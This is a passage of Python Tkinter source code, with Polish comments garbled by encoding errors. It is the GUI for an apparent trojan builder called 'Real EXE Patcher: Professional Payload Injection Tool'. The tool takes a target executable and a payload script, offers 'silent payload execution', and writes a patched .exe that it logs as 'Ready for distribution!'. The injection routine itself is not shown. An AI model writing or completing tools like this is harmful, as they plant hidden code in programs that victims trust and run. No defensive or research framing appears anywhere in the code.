            'accent': '#ff6b35',       # pomara≈Ñczowy akcent
            'accent_hover': '#ff8e53', # hover
            'success': '#238636',      # zielony
            'error': '#da3633',        # czerwony
            'warning': '#d29922',      # ≈º√≥≈Çty
            'border': '#30363d',       # szary border
            'button': '#238636',       # zielony przycisk
            'button_hover': '#2ea043'  # hover przycisk
        }
        
        self.root.configure(bg=self.colors['bg'])
        
        # Centrum okna na ekranie
        self.center_window()
        
    def center_window(self):
        """Wycentruj okno na ekranie"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")
        
    def setup_variables(self):
        """Zmienne GUI"""
        self.exe_path = tk.StringVar(value="No target EXE selected...")
        self.payload_path = tk.StringVar(value="No payload script selected...")
        self.output_path = tk.StringVar()
        self.progress_var = tk.StringVar(value="Ready to patch executables üéØ")
        self.is_patching = False
        
    def setup_styles(self):
        """Skonfiguruj style TTK - ekskluzywny look"""
        self.style = ttk.Style()
        
        # Ustaw theme
        try:
            self.style.theme_use('clam')
        except:
            pass
        
        # Konfiguracja styl√≥w - dark theme pro
        self.style.configure('Title.TLabel', 
                           background=self.colors['bg'],
                           foreground=self.colors['accent'],
                           font=('Segoe UI', 28, 'bold'))
                           
        self.style.configure('Subtitle.TLabel',
                           background=self.colors['bg'],
                           foreground=self.colors['fg'],
                           font=('Segoe UI', 11))
                           
        self.style.configure('Heading.TLabel',
                           background=self.colors['bg_secondary'],
                           foreground=self.colors['fg'],
                           font=('Segoe UI', 14, 'bold'))
                           
        self.style.configure('Custom.TLabel',
                           background=self.colors['bg_secondary'],
                           foreground=self.colors['fg'],
                           font=('Segoe UI', 10))
                           
        self.style.configure('Path.TLabel',
                           background=self.colors['bg_tertiary'],
                           foreground=self.colors['fg'],
                           font=('Consolas', 9),
                           relief='flat',
                           padding=(10, 8))
                           
        # Przyciski - ekskluzywne
        self.style.configure('Accent.TButton',
                           font=('Segoe UI', 10, 'bold'),
                           padding=(15, 8))
                           
        self.style.configure('Success.TButton',
                           font=('Segoe UI', 14, 'bold'),
                           padding=(20, 12))
                           
        # Ramki
        self.style.configure('Card.TFrame',
                           background=self.colors['bg_secondary'],
                           relief='flat',
                           borderwidth=1)
                           
    def create_widgets(self):
        """Stw√≥rz wszystkie widgety - ekskluzywny design"""
        # G≈Ç√≥wny container z paddingiem
        main_frame = tk.Frame(self.root, bg=self.colors['bg'])
        main_frame.pack(fill='both', expand=True, padx=25, pady=25)
        
        # Header sekcja
        self.create_header(main_frame)
        
        # Content area
        content_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        content_frame.pack(fill='both', expand=True, pady=(20, 0))
        
        # Left panel - file selection + options
        left_panel = tk.Frame(content_frame, bg=self.colors['bg'])
        left_panel.pack(side='left', fill='both', expand=True, padx=(0, 10))
        
        self.create_file_selection_section(left_panel)
        self.create_options_section(left_panel)
        self.create_patch_section(left_panel)
        
        # Right panel - logs
        right_panel = tk.Frame(content_frame, bg=self.colors['bg'])
        right_panel.pack(side='right', fill='both', expand=True, padx=(10, 0))
        
        self.create_log_section(right_panel)
        
        # Status bar na dole
        self.create_status_bar(main_frame)
        
    def create_header(self, parent):
        """Header z tytu≈Çem i opisem"""
        header_frame = tk.Frame(parent, bg=self.colors['bg'])
        header_frame.pack(fill='x', pady=(0, 20))
        
        # G≈Ç√≥wny tytu≈Ç
        title_label = ttk.Label(header_frame, text="‚ö° Real EXE Patcher ‚ö°", style='Title.TLabel')
        title_label.pack()
        
        # Podtytu≈Ç
        subtitle_label = ttk.Label(header_frame, 
                                 text="Professional Payload Injection Tool | Advanced PE Modification",
                                 style='Subtitle.TLabel')
        subtitle_label.pack(pady=(5, 0))
        
        # Separator line
        separator = tk.Frame(header_frame, height=2, bg=self.colors['accent'])
        separator.pack(fill='x', pady=(15, 0))
        
    def create_file_selection_section(self, parent):
        """Sekcja wyboru plik√≥w - elegant cards"""
        # Card container
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='x', pady=(0, 15))
        
        # Header
        header = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        header.pack(fill='x', padx=20, pady=(15, 10))
        
        ttk.Label(header, text="üìÅ File Selection", style='Heading.TLabel').pack(anchor='w')
        
        # Content area
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill='x', padx=20, pady=(0, 20))
        
        # Target EXE selection
        self.create_file_picker(content, "Target Executable:", self.exe_path, self.browse_exe, "üéØ")
        
        # Payload selection  
        self.create_file_picker(content, "Payload Script:", self.payload_path, self.browse_payload, "üí£")
        
    def create_file_picker(self, parent, label_text, var, command, icon):
        """Helper do tworzenia file picker√≥w"""
        container = tk.Frame(parent, bg=self.colors['bg_secondary'])
        container.pack(fill='x', pady=(0, 15))
        
        # Label z ikonƒÖ
        label_frame = tk.Frame(container, bg=self.colors['bg_secondary'])
        label_frame.pack(fill='x', pady=(0, 5))
        
        label = tk.Label(label_frame, text=f"{icon} {label_text}", 
                        bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                        font=('Segoe UI', 10, 'bold'))
        label.pack(anchor='w')
        
        # Path display + button
        path_frame = tk.Frame(container, bg=self.colors['bg_secondary'])
        path_frame.pack(fill='x')
        
        # Path label
        path_label = tk.Label(path_frame, textvariable=var,
                            bg=self.colors['bg_tertiary'], fg=self.colors['fg'],
                            font=('Consolas', 9), relief='solid', bd=1,
                            anchor='w', padx=10, pady=8)
        path_label.pack(side='left', fill='x', expand=True, padx=(0, 10))
        
        # Browse button
        browse_btn = tk.Button(path_frame, text="Browse", command=command,
                             bg=self.colors['accent'], fg='white',
                             font=('Segoe UI', 9, 'bold'), relief='flat',
                             padx=20, pady=8, cursor='hand2')
        browse_btn.pack(side='right')
        
        # Hover effects
        def on_enter(e):
            browse_btn.configure(bg=self.colors['accent_hover'])
        def on_leave(e):
            browse_btn.configure(bg=self.colors['accent'])
            
        browse_btn.bind('<Enter>', on_enter)
        browse_btn.bind('<Leave>', on_leave)
        
    def create_options_section(self, parent):
        """Sekcja opcji patchowania"""
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='x', pady=(0, 15))
        
        # Header
        header = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        header.pack(fill='x', padx=20, pady=(15, 10))
        
        ttk.Label(header, text="‚öôÔ∏è Patch Options", style='Heading.TLabel').pack(anchor='w')
        
        # Content
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill='x', padx=20, pady=(0, 20))
        
        # Auto-detect imports checkbox
        self.auto_imports = tk.BooleanVar(value=True)
        auto_check = tk.Checkbutton(content, text="üîç Auto-detect payload imports",
                                  variable=self.auto_imports,
                                  bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                                  selectcolor=self.colors['bg_tertiary'],
                                  font=('Segoe UI', 10))
        auto_check.pack(anchor='w', pady=(0, 8))
        
        # Silent execution
        self.silent_mode = tk.BooleanVar(value=True)
        silent_check = tk.Checkbutton(content, text="üîá Silent payload execution",
                                    variable=self.silent_mode,
                                    bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                                    selectcolor=self.colors['bg_tertiary'],
                                    font=('Segoe UI', 10))
        silent_check.pack(anchor='w', pady=(0, 8))
        
        # Cleanup after build
        self.cleanup_mode = tk.BooleanVar(value=True)
        cleanup_check = tk.Checkbutton(content, text="üßπ Cleanup build artifacts",
                                     variable=self.cleanup_mode,
                                     bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                                     selectcolor=self.colors['bg_tertiary'],
                                     font=('Segoe UI', 10))
        cleanup_check.pack(anchor='w')
        
    def create_patch_section(self, parent):
        """Sekcja g≈Ç√≥wnego przycisku patch"""
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='x', pady=(0, 15))
        
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill='x', padx=20, pady=20)
        
        # G≈Ç√≥wny przycisk patch
        self.patch_button = tk.Button(content, text="üöÄ START PATCHING",
                                    command=self.start_patching,
                                    bg=self.colors['success'], fg='white',
                                    font=('Segoe UI', 16, 'bold'), relief='flat',
                                    padx=30, pady=15, cursor='hand2')
        self.patch_button.pack(fill='x')
        
        # Hover effects dla g≈Ç√≥wnego przycisku
        def on_enter(e):
            if not self.is_patching:
                self.patch_button.configure(bg=self.colors['button_hover'])
        def on_leave(e):
            if not self.is_patching:
                self.patch_button.configure(bg=self.colors['success'])
                
        self.patch_button.bind('<Enter>', on_enter)
        self.patch_button.bind('<Leave>', on_leave)
        
    def create_log_section(self, parent):
        """Sekcja log√≥w - terminal style"""
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='both', expand=True)
        
        # Header
        header = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        header.pack(fill='x', padx=20, pady=(15, 10))
        
        header_label = ttk.Label(header, text="üìã Patch Logs", style='Heading.TLabel')
        header_label.pack(side='left')
        
        # Clear button
        clear_btn = tk.Button(header, text="Clear", command=self.clear_logs,
                            bg=self.colors['warning'], fg='white',
                            font=('Segoe UI', 8, 'bold'), relief='flat',
                            padx=15, pady=5, cursor='hand2')
        clear_btn.pack(side='right')
        
        # Log text area - terminal style
        log_frame = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        log_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
        
        self.log_text = scrolledtext.ScrolledText(log_frame,
                                                bg='#0d1117', fg='#58a6ff',
                                                font=('Consolas', 9),
                                                relief='solid', bd=1,
                                                wrap='word', state='disabled')
        self.log_text.pack(fill='both', expand=True)
        
        # Kolorowe tagi dla log√≥w
        self.log_text.tag_configure('info', foreground='#58a6ff')
        self.log_text.tag_configure('success', foreground='#3fb950')
        self.log_text.tag_configure('error', foreground='#f85149')
        self.log_text.tag_configure('warning', foreground='#d29922')
        
    def create_status_bar(self, parent):
        """Status bar na dole"""
        status_frame = tk.Frame(parent, bg=self.colors['bg_tertiary'], relief='solid', bd=1)
        status_frame.pack(fill='x', pady=(20, 0))
        
        # Status text
        self.status_label = tk.Label(status_frame, textvariable=self.progress_var,
                                   bg=self.colors['bg_tertiary'], fg=self.colors['fg'],
                                   font=('Segoe UI', 10), anchor='w', padx=15, pady=8)
        self.status_label.pack(side='left', fill='x', expand=True)
        
        # Version info
        version_label = tk.Label(status_frame, text="v2.0 Professional",
                               bg=self.colors['bg_tertiary'], fg=self.colors['accent'],
                               font=('Segoe UI', 9, 'bold'), padx=15, pady=8)
        version_label.pack(side='right')
        
    def browse_exe(self):
        """Wybierz target exe"""
        filetypes = [("Executable files", "*.exe"), ("All files", "*.*")]
        filename = filedialog.askopenfilename(title="Select Target EXE", filetypes=filetypes)
        if filename:
            self.exe_path.set(filename)
            self.log_message(f"Selected target EXE: {os.path.basename(filename)}", 'info')
            
    def browse_payload(self):
        """Wybierz payload script"""
        filetypes = [("Python files", "*.py"), ("All files", "*.*")]
        filename = filedialog.askopenfilename(title="Select Payload Script", filetypes=filetypes)
        if filename:
            self.payload_path.set(filename)
            self.log_message(f"Selected payload: {os.path.basename(filename)}", 'info')
            
    def start_patching(self):
        """Rozpocznij proces patchowania"""
        if self.is_patching:
            return
            
        # Walidacja input√≥w
        exe_path = self.exe_path.get()
        payload_path = self.payload_path.get()
        
        if not exe_path or exe_path.startswith("No target"):
            messagebox.showerror("Error", "Please select a target EXE file!")
            return
            
        if not payload_path or payload_path.startswith("No payload"):
            messagebox.showerror("Error", "Please select a payload script!")
            return
            
        if not os.path.exists(exe_path):
            messagebox.showerror("Error", f"Target EXE does not exist: {exe_path}")
            return
            
        if not os.path.exists(payload_path):
            messagebox.showerror("Error", f"Payload script does not exist: {payload_path}")
            return
            
        # Okre≈õl output path
        output_dir = Path.cwd() / "patched"
        output_dir.mkdir(exist_ok=True)
        
        base_name = os.path.splitext(os.path.basename(exe_path))[0]
        output_exe = str(output_dir / f"{base_name}_patched.exe")
        
        # Uruchom patchowanie w osobnym wƒÖtku
        self.is_patching = True
        self.patch_button.configure(text="üîÑ PATCHING...", bg=self.colors['warning'])
        self.progress_var.set("Patching in progress...")
        
        thread = threading.Thread(target=self.patch_thread, args=(exe_path, payload_path, output_exe))
        thread.daemon = True
        thread.start()
        
    def patch_thread(self, exe_path, payload_path, output_exe):
        """WƒÖtek patchowania"""
        try:
            self.log_message("="*60, 'info')
            self.log_message("üöÄ Starting EXE patching process...", 'info')
            self.log_message(f"Target: {os.path.basename(exe_path)}", 'info')
            self.log_message(f"Payload: {os.path.basename(payload_path)}", 'info')
            self.log_message("="*60, 'info')
            
            # Patchowanie
            success = self.patcher.patch_exe(exe_path, payload_path, output_exe)
            
            # Update UI w main thread
            self.root.after(0, self.patch_complete, success, output_exe)
            
        except Exception as e:
            self.root.after(0, self.patch_error, str(e))
            
    def patch_complete(self, success, output_exe):
        """Callback po zako≈Ñczeniu patchowania"""
        self.is_patching = False
        
        if success:
            self.patch_button.configure(text="‚úÖ PATCH COMPLETE", bg=self.colors['success'])
            self.progress_var.set(f"Success! Patched EXE: {os.path.basename(output_exe)}")
            self.log_message("="*60, 'success')
            self.log_message("‚úÖ PATCHING COMPLETED SUCCESSFULLY!", 'success')
            self.log_message(f"üì¶ Output: {output_exe}", 'success')
            self.log_message("üéØ Ready for distribution!", 'success')
            self.log_message("="*60, 'success')
            
            # Reset button po 3 sekundach
            self.root.after(3000, self.reset_patch_button)
            
        else:
            self.patch_button.configure(text="‚ùå PATCH FAILED", bg=self.colors['error'])
            self.progress_var.set("Patching failed - check logs for details")
            self.log_message("‚ùå PATCHING FAILED!", 'error')
            
            # Reset button po 3 sekundach
            self.root.after(3000, self.reset_patch_button)
            
    def patch_error(self, error_msg):
        """Callback w przypadku b≈Çƒôdu"""
        self.is_patching = False
        self.patch_button.configure(text="‚ùå ERROR", bg=self.colors['error'])
        self.progress_var.set("Error occurred during patching")
        self.log_message(f"‚ùå ERROR: {error_msg}", 'error')
        
        # Reset button po 3 sekundach
        self.root.after(3000, self.reset_patch_button)
        
    def reset_patch_button(self):
        """Reset g≈Ç√≥wnego przycisku"""
        self.patch_button.configure(text="üöÄ START PATCHING", bg=self.colors['success'])
        self.progress_var.set("Ready to patch executables üéØ")
        
    def log_callback(self, message):
        """Callback dla log√≥w z patchera"""
        # Okre≈õl typ wiadomo≈õci na podstawie zawarto≈õci
        if "‚úÖ" in message or "Success" in message or "zako≈Ñczone pomy≈õlnie" in message:
            tag = 'success'
        elif "‚ùå" in message or "B≈ÇƒÖd" in message or "Error" in message:
            tag = 'error'
        elif "‚ö†Ô∏è" in message or "Warning" in message:
            tag = 'warning'
        else:
            tag = 'info'
            
        # Update logs w main thread
        self.root.after(0, self.log_message, message, tag)
        
    def log_message(self, message, tag='info'):
        """Dodaj wiadomo≈õƒá do log√≥w"""
        self.log_text.configure(state='normal')
        self.log_text.insert('end', f"{message}\n", tag)
        self.log_text.configure(state='disabled')
        self.log_text.see('end')
        
    def clear_logs(self):
        """Wyczy≈õƒá logi"""
        self.log_text.configure(state='normal')
        self.log_text.delete('1.0', 'end')
        self.log_text.configure(state='disabled')
        self.log_message("Logs cleared", 'info')
